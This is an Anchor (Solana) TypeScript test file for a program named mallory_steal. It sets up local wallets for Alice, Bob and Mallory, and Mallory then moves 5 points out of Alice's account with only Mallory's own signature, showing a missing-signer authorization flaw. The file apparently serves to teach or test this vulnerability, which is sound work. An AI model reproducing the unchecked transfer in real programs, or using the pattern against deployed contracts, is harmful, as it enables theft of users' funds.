import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { MallorySteal } from "../target/types/mallory_steal";


async function airdropSol(publicKey, amount){
  let airdropTx = await anchor.getProvider().connection.requestAirdrop(publicKey, amount);
  await confirmTransaction(airdropTx);
}

async function confirmTransaction(tx) {
  const latestBlockHash = await anchor.getProvider().connection.getLatestBlockhash();
  await anchor.getProvider().connection.confirmTransaction({
    blockhash: latestBlockHash.blockhash,
    lastValidBlockHeight: latestBlockHash.lastValidBlockHeight,
    signature: tx,
  });
}


describe("mallory_steal", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env());
  const program = anchor.workspace.mallorySteal as Program<MallorySteal>;



  it("mallory steals", async () => {
    //create wallets
    const alice = anchor.web3.Keypair.generate();
    const bob = anchor.web3.Keypair.generate();
    const mallory = anchor.web3.Keypair.generate();

    // Airdrop SOL to the wallets
    await airdropSol(alice.publicKey, 1000000000);
    await airdropSol(bob.publicKey, 1000000000);
    await airdropSol(mallory.publicKey, 1000000000);

    // Create PDA for Alice
    let seeds_alice = [alice.publicKey.toBytes()];
    const [playerAlice, _bumpA] = anchor.web3.PublicKey.findProgramAddressSync(seeds_alice, program.programId);
    // Create PDA for Bob
    let seeds_bob = [bob.publicKey.toBytes()];
    const [playerBob, _bumpB] = anchor.web3.PublicKey.findProgramAddressSync(seeds_bob, program.programId);
    // Create PDA for Mallory
    let seeds_mallory = [mallory.publicKey.toBytes()];
    const [playerMallory, _bumpM] = anchor.web3.PublicKey.findProgramAddressSync(seeds_mallory, program.programId);


    // Initialize the game for Alice
    await program.methods.initialize().accounts({
      player: playerAlice,
      signer: alice.publicKey,
    }).signers([alice]).rpc();
    
    // Initialize the game for Bob  
    await program.methods.initialize().accounts({
      player: playerBob,
      signer: bob.publicKey,
    }).signers([bob]).rpc();

    //initialize the game for Mallory
    await program.methods.initialize().accounts({
      player: playerMallory,
      signer: mallory.publicKey,
    }).signers([mallory]).rpc();


    await program.methods.transferPoints(5).accounts({
      from: playerAlice,
      to: playerMallory,
      signer: mallory.publicKey,
    }).signers([mallory]).rpc();

    //check points
    console.log(`Alice has ${(await program.account.player.fetch(playerAlice)).points} points`);
    console.log(`Bob has ${(await program.account.player.fetch(playerBob)).points} points`)
    console.log(`Mallory has ${(await program.account.player.fetch(playerMallory)).points} points`)

  });
});
